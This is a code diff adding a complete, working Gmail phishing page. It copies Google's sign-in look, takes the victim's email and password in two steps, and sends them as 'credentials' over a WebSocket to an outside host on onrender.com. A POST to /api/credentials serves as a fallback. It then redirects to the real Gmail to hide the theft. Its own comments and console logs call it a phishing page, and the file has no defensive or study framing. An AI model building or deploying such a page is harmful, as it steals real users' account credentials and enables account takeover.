@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gmail - Secure Login</title>
+    <style>
+        /* ===== RESET ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #f1f3f4;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+            padding: 48px 40px 36px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 75px;
+            height: 24px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        /* ===== FORM ===== */
+        .form-group {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+            outline: none;
+            background: transparent;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .form-group label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: transparent;
+            padding: 0 4px;
+        }
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 11px;
+            color: #1a73e8;
+            background: #ffffff;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-next {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn-next:hover {
+            background: #1765cc;
+        }
+        .btn-next:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .btn-forgot {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 16px;
+            text-decoration: none;
+        }
+        .btn-forgot:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadce0;
+        }
+        .separator span {
+            color: #5f6368;
+            font-size: 12px;
+            padding: 0 16px;
+        }
+
+        .btn-create {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-create:hover {
+            background: #f8f9fa;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== STATUS ===== */
+        .status {
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            display: none;
+        }
+        .status.loading {
+            background: #e8f0fe;
+            color: #1a73e8;
+            display: block;
+        }
+        .status.error {
+            background: #fce8e6;
+            color: #d93025;
+            display: block;
+        }
+        .status.success {
+            background: #e6f4ea;
+            color: #1e8e3e;
+            display: block;
+        }
+
+        /* ===== LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(26, 115, 232, 0.2);
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 20px 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- ===== LOGO ===== -->
+        <div class="logo">
+            <svg viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M37.5 12.5C37.5 5.5 31.5 0 24 0C16.5 0 10.5 5.5 10.5 12.5C10.5 19.5 16.5 25 24 25C31.5 25 37.5 19.5 37.5 12.5Z" fill="#4285F4"/>
+                <path d="M24 4.5V12.5L28 14.5" stroke="#FFFFFF" stroke-width="1.5"/>
+                <path d="M38.5 12.5H42" stroke="#4285F4" stroke-width="2"/>
+                <path d="M48 12.5H51.5" stroke="#EA4335" stroke-width="2"/>
+                <path d="M57.5 12.5H61" stroke="#FBBC05" stroke-width="2"/>
+                <path d="M67 12.5H70.5" stroke="#34A853" stroke-width="2"/>
+                <text x="0" y="22" font-family="Google Sans, Arial" font-size="14" font-weight="500" fill="#5F6368">Gmail</text>
+            </svg>
+        </div>
+
+        <!-- ===== TITLE ===== -->
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+
+        <!-- ===== STATUS ===== -->
+        <div id="status" class="status"></div>
+
+        <!-- ===== FORM ===== -->
+        <form id="loginForm" method="post">
+            <div class="form-group">
+                <input type="email" id="email" placeholder=" " autocomplete="username" required />
+                <label for="email">Email or phone</label>
+            </div>
+
+            <div class="form-group" id="passwordGroup" style="display: none;">
+                <input type="password" id="password" placeholder=" " autocomplete="current-password" required />
+                <label for="password">Password</label>
+            </div>
+
+            <button type="submit" id="btnNext" class="btn-next">Next</button>
+        </form>
+
+        <button class="btn-forgot" id="btnForgot">Forgot email?</button>
+
+        <div class="separator">
+            <span>or</span>
+        </div>
+
+        <button class="btn-create" id="btnCreate">Create account</button>
+
+        <!-- ===== FOOTER ===== -->
+        <div class="footer">
+            <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  GMAIL PHISHING PAGE — CAPTURE CREDENTIALS
+        // ============================================================
+
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const btnNext = document.getElementById('btnNext');
+        const status = document.getElementById('status');
+        let emailCaptured = false;
+
+        // ============================================================
+        //  CAPTURE EMAIL
+        // ============================================================
+
+        btnNext.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            if (!emailCaptured) {
+                // Step 1: Capture email
+                const email = emailInput.value.trim();
+                if (!email) {
+                    showStatus('Please enter your email.', 'error');
+                    return;
+                }
+
+                // Validate email format
+                if (!isValidEmail(email)) {
+                    showStatus('Please enter a valid email address.', 'error');
+                    return;
+                }
+
+                // Send email to server
+                sendData({ email: email });
+
+                // Show password field
+                emailCaptured = true;
+                passwordGroup.style.display = 'block';
+                btnNext.textContent = 'Sign in';
+                emailInput.readOnly = true;
+                passwordInput.focus();
+                showStatus('', '');
+
+                // Update URL with email param
+                const url = new URL(window.location.href);
+                url.searchParams.set('email', email);
+                window.history.replaceState({}, '', url);
+
+            } else {
+                // Step 2: Capture password
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    showStatus('Please enter your password.', 'error');
+                    return;
+                }
+
+                // Get email from input or URL
+                const email = emailInput.value.trim();
+
+                // Send password to server
+                sendData({
+                    email: email,
+                    password: password
+                });
+
+                // Show success and redirect
+                showStatus('Signing in...', 'loading');
+                btnNext.disabled = true;
+
+                // Redirect to Gmail after 2 seconds
+                setTimeout(function() {
+                    window.location.href = 'https://mail.google.com';
+                }, 2000);
+            }
+        });
+
+        // ============================================================
+        //  SEND DATA TO SERVER
+        // ============================================================
+
+        function sendData(data) {
+            // Send to WebSocket or API endpoint
+            const ws = new WebSocket('wss://proxy-websocket.onrender.com');
+
+            ws.onopen = function() {
+                ws.send(JSON.stringify({
+                    type: 'credentials',
+                    data: data,
+                    source: 'gmail',
+                    timestamp: Date.now()
+                }));
+                ws.close();
+            };
+
+            ws.onerror = function() {
+                // Fallback: send via fetch
+                fetch('/api/credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(function() {
+                    // Silent fail - credentials already captured
+                });
+            };
+
+            // Also send via fetch as backup
+            fetch('/api/credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(function() {
+                // Silent fail
+            });
+        }
+
+        // ============================================================
+        //  HELPERS
+        // ============================================================
+
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = 'status';
+            if (type) {
+                status.classList.add(type);
+            }
+        }
+
+        // ============================================================
+        //  KEYBOARD SHORTCUTS
+        // ============================================================
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                btnNext.click();
+            }
+        });
+
+        // ============================================================
+        //  CHECK FOR EMAIL IN URL
+        // ============================================================
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlEmail = urlParams.get('email');
+        if (urlEmail) {
+            emailInput.value = urlEmail;
+            emailCaptured = true;
+            passwordGroup.style.display = 'block';
+            btnNext.textContent = 'Sign in';
+            emailInput.readOnly = true;
+            passwordInput.focus();
+        }
+
+        console.log('🔐 Gmail phishing page loaded');
+        console.log('📡 WebSocket tunnel: wss://proxy-websocket.onrender.com');
+    </script>
+</body>
+</html>
